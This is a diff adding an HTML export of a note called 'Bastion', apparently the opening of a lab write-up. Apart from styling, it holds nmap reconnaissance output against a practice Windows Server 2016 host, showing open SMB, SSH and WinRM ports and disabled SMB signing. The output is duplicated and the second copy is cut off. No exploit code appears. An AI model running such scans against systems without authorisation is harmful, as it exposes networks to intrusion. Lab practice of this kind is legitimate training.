@@ -1,0 +1,1230 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Bastion</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Bastion</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h3 id="bastion">Bastion</h3>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.136.29 -p-   
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-27 15:12 -0500
+Nmap scan report for 10.129.136.29
+Host is up (0.010s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-02-27T21:14:03+01:00
+|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-02-27T20:14:04
+|_  start_date: 2026-02-27T20:11:39
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+
+TRACEROUTE (using port 1723/tcp)
+HOP RTT     ADDRESS
+1   9.72 ms 10.10.14.1
+2   9.83 ms 10.129.136.29
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 92.14 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Bastion]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.136.29 -p-   
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-27 15:12 -0500
+Nmap scan report for 10.129.136.29
+Host is up (0.010s latency).
+Not shown: 65522 closed tcp ports (reset)
+PORT      STATE SERVICE      VERSION
+22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
+|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
+|_  256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+Device type: general purpose
+Running: Microsoft Windows 2016
+OS CPE: cpe:/o:microsoft:windows_server_2016
+OS details: Microsoft Windows Server 2016
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Bastion
+|   NetBIOS computer name: BASTION\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-02-27T21:14:03+01:00
+|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
